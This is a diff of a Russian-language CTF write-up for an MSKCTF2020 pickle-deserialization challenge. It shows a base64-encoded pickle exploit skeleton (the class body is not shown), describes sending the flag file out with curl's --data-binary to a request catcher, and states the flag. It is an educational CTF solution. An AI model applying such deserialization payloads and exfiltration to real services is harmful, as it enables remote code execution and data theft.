@@ -24,7 +24,7 @@ print(base64.b64encode(shellcode))
 Получаем запрос, значит эксплойт сработал. Осталось отправить себе флаг, однако для этого нужно понять, где он лежит. Пробуем несколько раз, получаем флаг. Для отправки файла себе я использовал опцию --data-binary.
 
 
-Финальный эксплойт:
+#### Финальный эксплойт:
 ```
 import pickle
 import base64
@@ -37,9 +37,8 @@ class Exp(object):
 shellcode = pickle.dumps(Exp(), protocol=0)
 print(base64.b64encode(shellcode))
 ```
-<br/>
 #### В результате должен прийти такой запрос:
-<br/>
+
 ![alt text](https://github.com/WATyag/MSKCTF2020/blob/master/pickle/requestbin.jpg "Request example")
-<br/>
+
 #### Флаг: MSKCTF{pickle_cant_be_easily_secured} 
